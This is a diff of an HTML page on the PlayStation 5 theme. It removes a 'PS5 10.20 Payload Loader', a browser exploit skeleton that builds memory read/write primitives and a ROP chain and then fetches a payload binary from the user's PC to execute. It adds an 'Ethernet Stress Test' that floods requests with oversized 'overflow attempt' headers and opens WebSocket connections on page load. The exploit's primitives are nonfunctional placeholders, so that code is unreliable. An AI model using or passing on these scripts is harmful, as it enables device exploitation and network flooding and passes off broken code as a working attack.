@@ -1,151 +1,57 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>PS5 10.20 Payload Loader</title>
-<style>
-body {
-    background-color: #111;
-    color: #0f0;
-    font-family: monospace;
-    padding: 10px;
-}
-#log {
-    white-space: pre-wrap;
-    word-break: break-word;
-}
-</style>
+    <title>Ethernet Stress Test</title>
+    <style>
+        body {
+            background-color: #111;
+            color: #0f0;
+            font-family: monospace;
+            padding: 20px;
+        }
+    </style>
 </head>
 <body>
-<h1>PS5 10.20 Payload Loader</h1>
-<div id="log">Cargando exploit...</div>
+    <h1>PS5 Ethernet Test</h1>
+    <div id="status">Iniciando test...</div>
 
-<script>
-const logArea = document.getElementById('log');
-function log(txt) {
-    console.log(txt);
-    logArea.innerText += "\n" + txt;
-}
-
-// --- Exploit comienza ---
-(async function() {
-    log("[*] Preparando heap...");
-
-    let ab1 = new ArrayBuffer(0x100);
-    let ab2 = new ArrayBuffer(0x100);
-    let u32_ab2 = new Uint32Array(ab2);
-
-    let victim = {marker: 0x41414141};
-
-    let corrupt = false;
-
-    function ftoi(val) {
-        const f = new Float64Array(1);
-        const i = new BigUint64Array(f.buffer);
-        f[0] = val;
-        return i[0];
-    }
-
-    function itof(val) {
-        const f = new Float64Array(1);
-        const i = new BigUint64Array(f.buffer);
-        i[0] = val;
-        return f[0];
-    }
-
-    function addrof(obj) {
-        victim.marker = obj;
-        return ftoi(u32_ab2[0]) & 0xffffffffn;
-    }
-
-    function fakeobj(addr) {
-        u32_ab2[0] = itof(addr);
-        return victim.marker;
-    }
-
-    function hex(n) {
-        return "0x" + n.toString(16);
-    }
-
-    function sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
-
-    await sleep(500);
-
-    log("[*] Heap preparado.");
-    log("[*] Intentando corromper...");
-
-    try {
-        let victim_addr = addrof(victim);
-        if (victim_addr) {
-            corrupt = true;
-        }
-    } catch(e) {}
-
-    if (!corrupt) {
-        log("[-] No se pudo corromper heap.");
-        return;
-    }
-
-    log("[+] Corrupción detectada.");
-    log("[*] Buscando primitivas...");
-
-    function read64(addr) {
-        u32_ab2[0] = itof(addr);
-        return ftoi(victim.marker);
-    }
-
-    function write64(addr, val) {
-        u32_ab2[0] = itof(addr);
-        victim.marker = itof(val);
-    }
-
-    log("[+] Primitivas listas.");
-
-    // Crear espacio para ROP
-    let rop = new ArrayBuffer(0x400);
-    let ropView = new DataView(rop);
-    let rop_addr = addrof(rop) + 0x20n;
-
-    function rop_write(off, val) {
-        ropView.setBigUint64(Number(off), val, true);
-    }
-
-    log("[*] Preparando ROP...");
-
-    const SYSCALL_RET = 0x2333445564343n; // Falso placeholder
-    const JOPCHAIN_ADDR = rop_addr + 0x100n;
-
-    function trigger_payload(buffer) {
-        log("[*] Ejecutando payload...");
-
-        for (let i = 0; i < buffer.byteLength; i += 8) {
-            let val = new DataView(buffer).getBigUint64(i, true);
-            write64(JOPCHAIN_ADDR + BigInt(i), val);
+    <script>
+        function floodFetch() {
+            for (let i = 0; i < 1000; i++) {
+                try {
+                    fetch(`http://192.0.2.${i % 255}/nonexistent${Math.random()}`, {
+                        method: 'GET',
+                        headers: {
+                            'X-Custom-Header': 'A'.repeat(5000), // Cabecera muy grande
+                            'X-Overflow-Attempt': 'B'.repeat(10000) // Intento de buffer overflow
+                        },
+                        mode: 'no-cors',
+                        cache: 'no-store',
+                        keepalive: true,
+                    }).catch(() => {});
+                } catch (e) {
+                    console.log(e);
+                }
+            }
         }
 
-        rop_write(0x00n, JOPCHAIN_ADDR);
-        rop_write(0x08n, SYSCALL_RET);
+        function floodWebSocket() {
+            for (let i = 0; i < 100; i++) {
+                try {
+                    new WebSocket(`ws://192.0.2.${i % 255}/badpath${Math.random()}`);
+                } catch (e) {
+                    console.log(e);
+                }
+            }
+        }
 
-        setTimeout(() => {
-            log("[*] Payload lanzado!");
-        }, 500);
-    }
+        function startTest() {
+            document.getElementById('status').textContent = "Lanzando ataques...";
+            setInterval(floodFetch, 500);
+            setInterval(floodWebSocket, 2000);
+        }
 
-    async function load_payload(url) {
-        log("[*] Cargando payload desde: " + url);
-        let response = await fetch(url);
-        let buffer = await response.arrayBuffer();
-        log("[+] Payload descargado (" + buffer.byteLength + " bytes).");
-
-        trigger_payload(buffer);
-    }
-
-    await load_payload("http://your-pc-ip:9090/payload.bin"); // Cambiar por tu IP
-
-})();
-</script>
-
+        window.onload = startTest;
+    </script>
 </body>
 </html>
